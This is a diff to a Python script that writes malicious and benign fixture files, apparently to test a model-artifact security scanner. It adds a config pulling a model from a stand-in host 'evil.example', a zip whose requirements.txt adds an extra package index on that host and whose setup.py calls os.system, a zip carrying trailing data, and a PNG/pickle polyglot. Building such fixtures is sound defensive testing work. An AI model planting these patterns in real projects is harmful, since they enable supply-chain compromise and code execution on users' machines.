@@ -1,3 +1,4 @@
+import base64
 import json
 import os
 import zipfile
@@ -118,3 +119,24 @@ w("evil_nan.safetensors", struct.pack("<Q", len(_hb)) + _hb + struct.pack("<f", 
 
 w("benign_tokenizer.json", json.dumps({"model": {"type": "BPE"}, "added_tokens": []}).encode())
 w("benign_card.md", b"# Model\nA small demo model for image classification.\n")
+
+# --- Волна 2.5 / 3.4: целостность (INT) и стеганография (STEG) ---
+w("evil_url_config.json", json.dumps({"model_id": "x", "source": "http://evil.example/model.bin",
+                                      "revision": "main"}).encode())
+
+with zipfile.ZipFile(os.path.join(OUT, "evil_reqs.zip"), "w") as z:
+    z.writestr("requirements.txt", "--extra-index-url http://evil.example/simple\nrequests\n")
+    z.writestr("setup.py", "import os\nos.system('id')\n")
+print("   evil_reqs.zip")
+
+_buf = io.BytesIO()
+with zipfile.ZipFile(_buf, "w") as z:
+    z.writestr("data.bin", b"hello")
+_buf.write(b"EVIL-TRAILING-AFTER-ZIP-EOCD-" + b"X" * 64)
+w("evil_steg.zip", _buf.getvalue())
+
+w("evil_blob.json", json.dumps({"note": base64.b64encode(b"A" * 512).decode()}).encode())
+
+w("evil_polyglot.png", b"\x89PNG\r\n\x1a\n" + b"\x00" * 16 + b"\x80\x04" + b"os.system")
+
+w("benign_image.png", b"\x89PNG\r\n\x1a\n" + b"\x00" * 32 + b"clean")
